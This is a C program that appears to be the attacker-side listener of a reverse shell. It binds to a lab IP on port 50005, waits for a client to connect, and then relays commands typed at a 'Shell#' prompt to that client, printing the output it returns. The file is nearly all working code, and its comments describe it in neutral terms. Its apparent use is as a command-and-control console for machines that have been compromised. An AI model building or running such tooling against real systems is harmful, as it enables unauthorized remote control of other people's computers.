#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

/*
 * This program creates a simple TCP server that listens for incoming connections on a specified IP address and port.
 * Once a client connects, the server enters a loop where it accepts shell-like command input from the server's standard input,
 * sends the command to the connected client, and prints the client's response. The loop continues until the command 'q' is entered,
 * which terminates the connection and closes the server.
 */
int main()
{
    int sock, client_socket;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_address, client_address;
    int optval = 1;
    socklen_t client_length;

    // Create socket
    // AF_INET: IPv4, SOCK_STREAM: TCP, 0: IP protocol
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Error creating socket");
        return 1;
    }

    // Set socket options
    // SO_REUSEADDR: Allows the socket to be bound to an address that is already in use
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        perror("Error setting TCP socket options");
        close(sock);
        return 1;
    }
    
    // Configure server address
    // sin_family: Address family (IPv4), sin_addr: IP address, sin_port: Port number (50005)
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr("192.168.175.130"); // Server IP address
    server_address.sin_port = htons(50005);

    // Bind socket to the specified IP address and port
    if (bind(sock, (struct sockaddr *) &server_address, sizeof(server_address)) < 0) {
        perror("Error binding socket");
        close(sock);
        return 1;
    }
    
    // Listen on the socket for incoming connections
    // 5: Maximum number of pending connections
    if (listen(sock, 5) < 0) {
        perror("Error listening on socket");
        close(sock);
        return 1;
    }

    // Accept client connections
    client_length = sizeof(client_address);
    client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);
    if (client_socket < 0) {
        perror("Error accepting client connection");
        close(sock);
        return 1;
    }

    // Main loop to handle shell-like command input and output
    while (1) {
        jump:
        bzero(&buffer, sizeof(buffer));  // Clear the buffer
        bzero(&response, sizeof(response));  // Clear the response
        printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));  // Display prompt with client's IP address
        fgets(buffer, sizeof(buffer), stdin);  // Read input from stdin
        strtok(buffer, "\n");  // Remove trailing newline character
        write(client_socket, buffer, sizeof(buffer));  // Send the command to the client
        if (strncmp("q", buffer, 1) == 0) {
            break;  // Exit the loop if the command is 'q'
        } else {
            recv(client_socket, response, sizeof(response), MSG_WAITALL);  // Receive the response from the client
            printf("%s", response);  // Print the response
        }
    }

    // Close the sockets
    close(client_socket);
    close(sock);
    return 0;
}
